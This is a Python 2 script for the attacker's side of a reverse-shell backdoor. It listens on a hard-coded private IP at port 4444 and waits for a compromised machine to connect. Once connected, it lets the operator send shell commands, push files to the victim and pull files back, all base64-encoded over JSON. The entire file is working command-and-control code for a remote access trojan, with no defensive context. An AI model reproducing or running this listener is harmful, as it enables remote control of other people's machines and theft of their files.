#!/usr/bin/env python
import socket
import json
import base64

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("[+] Waiting for Incoming Connection")
        self.connection,address = listener.accept()
        print("[+] Got a Connection from " + str(address))

    def proper_send(self,data):
        json_data = json.dumps(data)
        return self.connection.send(json_data)

    def proper_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(4096)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command(self,command):
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.proper_receive()

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_data(self,filename,content):
        with open(filename, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download Successfull"

    def run(self):
        while True:
            command = raw_input(">>")
            command = command.split(" ")
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                self.proper_send(command)
                response = self.execute_command(command)

                if command[0] == "download" and "[-] Error" not in response:
                    response = self.write_data(command[1],response)
            except Exception:
                response = "[-] Error during command execution."

            print(response)

server_ip = "192.168.43.177"
server_port = 4444

my_listener = Listener(server_ip, server_port)
my_listener.run()